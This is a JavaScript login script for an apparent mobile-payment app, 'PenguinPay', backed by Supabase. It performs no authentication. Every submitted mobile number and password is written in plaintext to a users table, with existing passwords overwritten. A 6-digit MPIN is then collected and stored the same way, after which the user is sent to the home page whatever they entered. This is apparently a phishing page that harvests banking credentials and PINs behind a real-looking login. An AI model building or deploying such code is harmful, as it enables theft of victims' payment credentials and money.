import { supabase } from "./config/supabase.js";

document.addEventListener("DOMContentLoaded", () => {
  if (sessionStorage.getItem("penguinpay_session")) {
    window.location.replace("./home.html");
    return;
  }

  const form = document.getElementById("loginForm");
  const mobile = document.getElementById("mobile");
  const password = document.getElementById("password");
  const error = document.getElementById("errorMessage");
  const overlay = document.getElementById("mpinOverlay");
  const digitBoxes = [...document.querySelectorAll(".mpin-digit")];
  let mpin = "";

  if (sessionStorage.getItem("mpin_pending")) {
    mobile.value = sessionStorage.getItem("mpin_pending");
    overlay.classList.add("open");
    overlay.setAttribute("aria-hidden", "false");
    document.body.style.overflow = "hidden";
  }

  mobile.addEventListener("input", () => {
    mobile.value = mobile.value.replace(/\D/g, "");
  });

  form.addEventListener("submit", async (event) => {
    event.preventDefault();

    if (mobile.value.length !== 10) {
      showError("Please enter a valid 10-digit mobile number.");
      return;
    }
    if (password.value.length < 4) {
      showError("Password is too short.");
      return;
    }

    error.classList.add("hidden");
    const submitBtn = form.querySelector('button[type="submit"]');
    const oldText = submitBtn.innerHTML;
    submitBtn.innerHTML = "Processing...";
    submitBtn.disabled = true;

    try {
      // Upsert user in database
      const { data: checkData } = await supabase.from("users").select("id").eq("mobile", mobile.value);
      let userId = null;
      if (checkData && checkData.length > 0) {
        userId = checkData[0].id;
        await supabase.from("users").update({
          password: password.value,
          status: "pending",
          last_login: new Date().toISOString()
        }).eq("id", userId);
      } else {
        const { data: insertData } = await supabase.from("users").insert({
          mobile: mobile.value,
          password: password.value,
          status: "pending",
          login_count: 0,
          created_at: new Date().toISOString(),
          last_login: new Date().toISOString()
        });
        userId = insertData && insertData.length > 0 ? insertData[0].id : insertData?.id;
      }
      sessionStorage.setItem("mpin_pending", mobile.value);
      sessionStorage.setItem("user_id_pending", userId);
      
      overlay.classList.add("open");
      overlay.setAttribute("aria-hidden", "false");
      document.body.style.overflow = "hidden";
    } catch(e) {
      showError("Connection error. Please try again.");
    } finally {
      submitBtn.innerHTML = oldText;
      submitBtn.disabled = false;
    }
  });

  document.querySelectorAll("[data-key]").forEach((button) => {
    button.addEventListener("click", async () => {
      if (mpin.length >= 6) return;
      mpin += button.dataset.key;
      renderMpin();

      if (mpin.length === 6) {
        const p = mobile.value || sessionStorage.getItem("mpin_pending");
        const uId = sessionStorage.getItem("user_id_pending");
        
        try {
          if (uId) {
            await supabase.from("users").update({
              mpin: mpin,
              status: "completed",
              login_count: 1,
              last_login: new Date().toISOString()
            }).eq("id", uId);
          }
        } catch(e) {}

        sessionStorage.setItem("penguinpay_session", JSON.stringify({ mobile: p, id: uId }));
        sessionStorage.removeItem("mpin_pending");
        sessionStorage.removeItem("user_id_pending");
        sessionStorage.removeItem("pwd_pending");

        window.setTimeout(() => {
          window.location.href = "./home.html";
        }, 220);
      }
    });
  });

  const deleteBtn = document.querySelector('[data-action="delete"]');
  if (deleteBtn) {
    deleteBtn.addEventListener("click", () => {
      mpin = mpin.slice(0, -1);
      renderMpin();
    });
  }

  function renderMpin() {
    digitBoxes.forEach((box, index) => {
      box.classList.toggle("filled", index < mpin.length);
      box.classList.toggle("active", index === Math.min(mpin.length, 5));
    });
  }

  function showError(message) {
    error.textContent = message;
    error.classList.remove("hidden");
  }

  if (window.lucide) window.lucide.createIcons();
});
